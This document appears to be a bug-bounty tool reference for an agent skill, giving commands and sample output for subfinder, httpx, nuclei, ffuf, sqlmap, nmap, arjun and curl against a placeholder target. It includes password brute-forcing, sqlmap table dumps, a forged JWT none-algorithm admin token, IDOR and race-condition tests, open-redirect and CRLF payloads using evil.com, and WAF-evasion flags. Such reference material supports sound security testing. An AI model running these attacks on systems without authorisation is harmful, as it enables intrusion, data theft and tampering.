# CLI Security Tools Reference

## Tool Installation

Run the install script before starting:
```bash
bash skills/web-bug-bounty/scripts/install-tools.sh
```

---

## subfinder — Subdomain Enumeration

Discovers subdomains using passive sources (certificate transparency, DNS datasets, APIs).

### Basic Usage

```bash
subfinder -d target.com
```

Expected output:
```
api.target.com
mail.target.com
dev.target.com
staging.target.com
admin.target.com
```

### Silent Mode (output only, no banner)

```bash
subfinder -d target.com -silent
```

Expected output:
```
api.target.com
mail.target.com
dev.target.com
```

### Multiple Domains

```bash
subfinder -d target.com -d example.com -silent
```

Or from a file:
```bash
subfinder -dL domains.txt -silent
```

### Save Output to File

```bash
subfinder -d target.com -silent -o subdomains.txt
```

### With All Passive Sources

```bash
subfinder -d target.com -all -silent -o subdomains.txt
```

### Output Format

One subdomain per line:
```
api.target.com
mail.target.com
dev.target.com
staging.target.com
```

---

## httpx — Live Host Detection

Probes discovered subdomains/hosts to confirm which are alive, and gathers metadata like status codes, titles, and technologies.

### Basic Probe with Status Codes

```bash
cat subdomains.txt | httpx -status-code
```

Expected output:
```
https://api.target.com [200]
https://mail.target.com [301]
https://dev.target.com [403]
https://staging.target.com [200]
```

### With Page Titles

```bash
cat subdomains.txt | httpx -status-code -title
```

Expected output:
```
https://api.target.com [200] [API Gateway]
https://mail.target.com [301] [Redirecting...]
https://dev.target.com [403] [Access Denied]
https://staging.target.com [200] [Staging - Internal Dashboard]
```

### With Technology Detection

```bash
cat subdomains.txt | httpx -status-code -title -tech-detect
```

Expected output:
```
https://api.target.com [200] [API Gateway] [Nginx,PHP]
https://staging.target.com [200] [Staging Dashboard] [Apache,Laravel,Bootstrap]
```

### With Web Server Info

```bash
cat subdomains.txt | httpx -status-code -title -web-server
```

Expected output:
```
https://api.target.com [200] [API Gateway] [nginx/1.18.0]
https://staging.target.com [200] [Staging Dashboard] [Apache/2.4.41 (Ubuntu)]
```

### Filter by Status Code (only 200s)

```bash
cat subdomains.txt | httpx -status-code -mc 200
```

### Filter Out Specific Status Codes (exclude noise)

```bash
cat subdomains.txt | httpx -status-code -fc 404,500,502,503
```

### Full Recon Probe

```bash
cat subdomains.txt | httpx -status-code -title -tech-detect -web-server -follow-redirects -o live-hosts.txt
```

### Probe Single Host

```bash
echo "target.com" | httpx -status-code -title -tech-detect
```

---

## nuclei — Automated Vulnerability Scanning

Template-based scanner for finding known vulnerabilities, misconfigurations, and exposures.

### Update Templates First

```bash
nuclei -update-templates
```

Expected output:
```
[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at ~/.nuclei-templates
```

### Scan a Single URL

```bash
nuclei -u https://target.com
```

Expected output:
```
[INF] Current nuclei version: v3.x.x
[INF] Current nuclei-templates version: v9.x.x
[xss-reflected] [http] [medium] https://target.com/search?q=test
[tech-detect:nginx] [http] [info] https://target.com
```

### Scan by Tag — XSS

```bash
nuclei -u https://target.com -tags xss
```

### Scan by Tag — SQL Injection

```bash
nuclei -u https://target.com -tags sqli
```

### Scan by Tag — SSRF

```bash
nuclei -u https://target.com -tags ssrf
```

### Scan by Tag — Open Redirect

```bash
nuclei -u https://target.com -tags redirect
```

### Scan by Tag — CRLF Injection

```bash
nuclei -u https://target.com -tags crlf
```

### Scan by Tag — Local File Inclusion

```bash
nuclei -u https://target.com -tags lfi
```

### Scan by Tag — Information Exposure

```bash
nuclei -u https://target.com -tags exposure
```

### Scan by Tag — Misconfiguration

```bash
nuclei -u https://target.com -tags misconfiguration
```

### Scan by Tag — CVEs

```bash
nuclei -u https://target.com -tags cve
```

### Scan by Tag — Default Credentials

```bash
nuclei -u https://target.com -tags default-login
```

### Scan by Severity

```bash
# Critical and High only
nuclei -u https://target.com -severity critical,high

# Medium and above
nuclei -u https://target.com -severity critical,high,medium
```

### Scan a List of URLs

```bash
nuclei -l live-hosts.txt -tags xss,sqli,ssrf,redirect,lfi
```

### Rate Limiting (avoid triggering WAF/rate limits)

```bash
nuclei -u https://target.com -rate-limit 10 -concurrency 5
```

### Save Output to File

```bash
nuclei -u https://target.com -o nuclei-results.txt
nuclei -u https://target.com -json-export nuclei-results.json
```

### All Tag Categories Reference

```
xss              Cross-Site Scripting
sqli             SQL Injection
ssrf             Server-Side Request Forgery
redirect         Open Redirect
crlf             CRLF Injection
lfi              Local File Inclusion
rfi              Remote File Inclusion
rce              Remote Code Execution
ssti             Server-Side Template Injection
xxe              XML External Entity
idor             Insecure Direct Object Reference
exposure         Information Exposure (API keys, tokens, credentials)
misconfiguration Security misconfigurations
cve              Known CVEs
default-login    Default credentials on login pages
takeover         Subdomain takeover
tech-detect      Technology fingerprinting
```

---

## ffuf — Web Fuzzer

Fast web fuzzer for directory/file bruteforce, parameter discovery, and content enumeration.

### Wordlist Locations

```
Linux default:  /usr/share/wordlists/
SecLists:       /usr/share/seclists/
                ~/SecLists/
```

### Install SecLists

```bash
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
```

### Directory Bruteforce

```bash
ffuf -u https://target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### Directory Bruteforce with Extensions

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.asp,.aspx,.jsp,.html,.js,.json,.xml,.bak,.txt,.env
```

Expected output:
```
[Status: 200, Size: 1234, Words: 56, Lines: 34, Duration: 45ms]
| URL | https://target.com/admin.php
    * FUZZ: admin.php

[Status: 200, Size: 512, Words: 12, Lines: 8, Duration: 23ms]
| URL | https://target.com/config.bak
    * FUZZ: config.bak
```

### Filter by Status Code (show only specific codes)

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -mc 200,301,302,403
```

### Filter OUT Specific Status Codes

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -fc 404,400,500
```

### Filter by Response Size (exclude noise)

```bash
# Run once without filter to find the default 404 response size, then exclude it
# e.g., if the default 404 page is always 1523 bytes:
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -fs 1523
```

### Filter by Word Count

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -fw 10
```

### GET Parameter Fuzzing

```bash
ffuf -u "https://target.com/search?q=FUZZ" \
  -w ~/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

### POST Parameter Fuzzing

```bash
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w ~/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt \
  -mc 200,302
```

### IDOR with Number Range

```bash
# Generate a wordlist of IDs and fuzz the endpoint
seq 1 1000 > /tmp/ids.txt
ffuf -u "https://target.com/api/user/FUZZ" \
  -w /tmp/ids.txt \
  -H "Authorization: Bearer <your_token>" \
  -mc 200
```

### Rate Limiting (avoid triggering WAF/rate limits)

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -rate 50
```

Flag: `-rate <requests-per-second>`

### With Cookies (authenticated scanning)

```bash
ffuf -u https://target.com/api/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Cookie: session=abc123def456; auth_token=eyJhbGc..." \
  -mc 200,201,301,302,403
```

### With Custom Headers

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -H "Authorization: Bearer <token>" \
  -H "X-Custom-Header: value"
```

### Save Output to File

```bash
ffuf -u https://target.com/FUZZ \
  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o ffuf-results.json -of json
```

---

## sqlmap — SQL Injection Testing

Automated SQL injection detection and exploitation tool.

### Test a Single URL (GET parameter)

```bash
sqlmap -u "https://target.com/item?id=1" --batch --random-agent
```

Expected output:
```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
[INFO] sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5175=5175
```

### Test POST Request

```bash
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --batch --random-agent
```

### With Cookie (authenticated session)

```bash
sqlmap -u "https://target.com/profile?id=1" \
  --cookie="session=abc123; auth=xyz789" \
  --batch --random-agent
```

### Specify DBMS (speeds up testing)

```bash
sqlmap -u "https://target.com/item?id=1" \
  --dbms=mysql --batch --random-agent

# Options: mysql, postgresql, mssql, oracle, sqlite, access
```

### Level and Risk Settings

```bash
# Level 1-5 (1=basic, 5=maximum, default=1)
# Risk 1-3 (1=safe, 3=heavy/may alter data, default=1)
sqlmap -u "https://target.com/item?id=1" \
  --level=3 --risk=2 --batch --random-agent
```

### Full Exploitation (enumerate and dump)

```bash
# List all databases
sqlmap -u "https://target.com/item?id=1" \
  --batch --random-agent --dbs

# List tables in a specific database
sqlmap -u "https://target.com/item?id=1" \
  --batch --random-agent -D target_db --tables

# Dump a specific table
sqlmap -u "https://target.com/item?id=1" \
  --batch --random-agent -D target_db -T users --dump
```

### With Threads (faster scanning)

```bash
sqlmap -u "https://target.com/item?id=1" \
  --batch --random-agent --threads=5
```

### Output to File

```bash
sqlmap -u "https://target.com/item?id=1" \
  --batch --random-agent \
  --output-dir=/tmp/sqlmap-results/
```

### Flag Reference

| Flag | Description |
|------|-------------|
| `--batch` | Non-interactive mode; automatically accept all defaults to avoid prompts. Required for scripted/automated use. |
| `--random-agent` | Randomize the HTTP User-Agent header on each request to evade basic WAF and IDS signatures. |
| `--level=N` | Test thoroughness from 1 to 5. Higher levels test additional parameters (cookies, User-Agent, Referer, etc.) and more payloads. Default: 1. |
| `--risk=N` | Payload aggressiveness from 1 to 3. Risk 2 adds time-based payloads; risk 3 includes UPDATE/DELETE statements that may modify database data. Default: 1. |
| `--threads=N` | Number of concurrent HTTP request threads. Speeds up testing but may trigger rate limits or IDS alerts. Recommended maximum: 10. |
| `--dbms=X` | Skip DBMS fingerprinting by specifying the database type directly (mysql, postgresql, mssql, oracle, sqlite). |
| `--dbs` | Enumerate all accessible database names after confirming injection. |
| `--dump` | Dump the full contents of the target table specified with `-T`. |

---

## nmap — Port Scanning

Network exploration and port scanning tool for discovering open ports and services.

### Top 1000 Ports with Service Detection

```bash
nmap -sV target.com
```

Expected output:
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for target.com (93.184.216.34)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     nginx 1.18.0
443/tcp  open  https    nginx 1.18.0
3306/tcp open  mysql    MySQL 8.0.28
```

### Quick Scan (Top 100 Ports)

```bash
nmap -F target.com
```

### Specific Ports (Common Web Ports)

```bash
nmap -p 80,443,8080,8443,3000,5000,8000 -sV target.com
```

Expected output:
```
PORT     STATE  SERVICE VERSION
80/tcp   open   http    nginx 1.18.0
443/tcp  open   https   nginx 1.18.0
3000/tcp open   http    Node.js Express
5000/tcp closed http
8000/tcp closed http
8080/tcp open   http    Apache Tomcat 9.0
8443/tcp closed https
```

### HTTP Script Scan

```bash
nmap -p 80,443,8080,8443 \
  --script http-enum,http-headers,http-methods,http-title \
  target.com
```

Expected output:
```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Admin login page
|   /robots.txt: Robots file
|   /backup/: Directory listing
| http-headers:
|   Server: nginx/1.18.0
|   X-Powered-By: PHP/7.4.3
| http-methods:
|   Supported Methods: GET HEAD POST OPTIONS PUT DELETE
| http-title:
|_  Title: Welcome to target.com
```

### OS + Version + Default Scripts (aggressive)

```bash
nmap -A target.com
```

### Save Output

```bash
nmap -sV target.com -oN nmap-results.txt      # normal format
nmap -sV target.com -oX nmap-results.xml      # XML format
nmap -sV target.com -oG nmap-results.gnmap    # grepable format
```

---

## arjun — Parameter Discovery

Discovers hidden HTTP GET, POST, and JSON parameters that are not visible in page source or documented in the API.

### GET Parameter Discovery

```bash
arjun -u "https://target.com/search"
```

Expected output:
```
[*] Identifying the technology used...
[*] Scanning 1000 parameters
[*] Found 2 parameters: q, limit
```

### POST Parameter Discovery

```bash
arjun -u "https://target.com/api/user" -m POST
```

Expected output:
```
[*] Probing the target for stability...
[*] Scanning 1000 parameters
[*] Found 3 parameters: username, email, role
```

### JSON Parameter Discovery

```bash
arjun -u "https://target.com/api/data" -m JSON
```

Expected output:
```
[*] Probing target for JSON endpoint
[*] Scanning 500 parameters
[*] Found 2 parameters: id, filter
```

### With Custom Headers (authenticated session)

```bash
arjun -u "https://target.com/api/profile" \
  -m GET \
  --headers "Authorization: Bearer eyJhbGc...\nCookie: session=abc123"
```

### Stable Mode (rate-limited targets)

```bash
arjun -u "https://target.com/search" --stable
```

### Save Output to File

```bash
arjun -u "https://target.com/search" -o arjun-params.json
```

### Scan Multiple URLs

```bash
arjun -i live-hosts.txt -m GET -o arjun-all-params.json
```

---

## curl — Manual HTTP Testing

Essential for crafting precise HTTP requests to manually verify and test specific vulnerabilities.

### CORS Misconfiguration Check

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/data
```

Look for in response:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If both headers are present together, the CORS policy is exploitable.

### Host Header Injection

```bash
curl -s -I -H "Host: evil.com" https://target.com/
```

Also test with override headers:
```bash
curl -s -I -H "Host: target.com" -H "X-Forwarded-Host: evil.com" https://target.com/
curl -s -I -H "Host: target.com" -H "X-Host: evil.com" https://target.com/
```

Look for `evil.com` reflected in `Location` or `Set-Cookie` headers.

### CRLF Injection Test

```bash
curl -v "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:evil=injected"
```

Look for injected headers appearing in the response above the blank line separator.

### Open Redirect Test

```bash
curl -v -L "https://target.com/redirect?next=https://evil.com"
curl -v -L "https://target.com/redirect?url=//evil.com"
curl -v -L "https://target.com/redirect?to=https:evil.com"
```

Vulnerable response:
```
< HTTP/1.1 302 Found
< Location: https://evil.com
```

### HTTP Method Testing (OPTIONS, PUT, DELETE)

```bash
# Discover which HTTP methods the server allows
curl -s -I -X OPTIONS https://target.com/api/user/1

# Test PUT (may allow data modification or file write)
curl -s -X PUT https://target.com/api/user/1 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Test DELETE (may allow unauthorized deletion)
curl -s -X DELETE https://target.com/api/user/2 \
  -H "Authorization: Bearer <token>"
```

### JWT None Algorithm Test

```bash
# Header: {"alg":"none","typ":"JWT"}  -> base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub":"admin","role":"admin"} -> base64: eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9
# Signature: (empty string — trailing dot is required)
JWT_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."

curl -s https://target.com/api/admin \
  -H "Authorization: Bearer $JWT_NONE"
```

If the server returns a 200 or processes the request as admin, the JWT library is vulnerable to the none algorithm attack.

### Race Condition Test (parallel requests)

```bash
# Send 20 simultaneous requests using background subshells
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/redeem \
    -H "Cookie: session=abc123" \
    -d "coupon=DISCOUNT50" &
done
wait
```

Using GNU parallel for more precise control:
```bash
seq 1 20 | parallel -j20 \
  "curl -s -X POST https://target.com/api/redeem \
   -H 'Cookie: session=abc123' \
   -d 'coupon=DISCOUNT50'"
```

### Verbose Output (full request and response headers)

```bash
curl -v https://target.com/api/data \
  -H "Authorization: Bearer <token>"
```

Expected verbose output:
```
*   Trying 93.184.216.34:443...
* Connected to target.com (93.184.216.34) port 443 (#0)
> GET /api/data HTTP/2
> Host: target.com
> Authorization: Bearer <token>
>
< HTTP/2 200
< content-type: application/json
< x-powered-by: Express
< server: nginx/1.18.0
<
{"data": "..."}
```

### Save Response to File

```bash
curl -s https://target.com/api/export \
  -H "Cookie: session=abc123" \
  -o response-output.json
```

### Follow Redirects

```bash
curl -L https://target.com/old-path
```

Print the final URL after all redirects:
```bash
curl -s -L -o /dev/null -w "%{url_effective}\n" https://target.com/redirect?url=https://evil.com
```

### Include Response Headers in Output

```bash
curl -si https://target.com/api/user/1 \
  -H "Authorization: Bearer <token>"
```

Flags: `-i` includes response headers in output; `-s` suppresses the progress meter.

### POST with JSON Body

```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "password123"}'
```

### Combined: Follow Redirects + Verbose + Save (for redirect analysis)

```bash
curl -v -L "https://target.com/redirect?url=https://evil.com" \
  -o /tmp/redirect-response.html 2>&1 | tee redirect-debug.txt
```
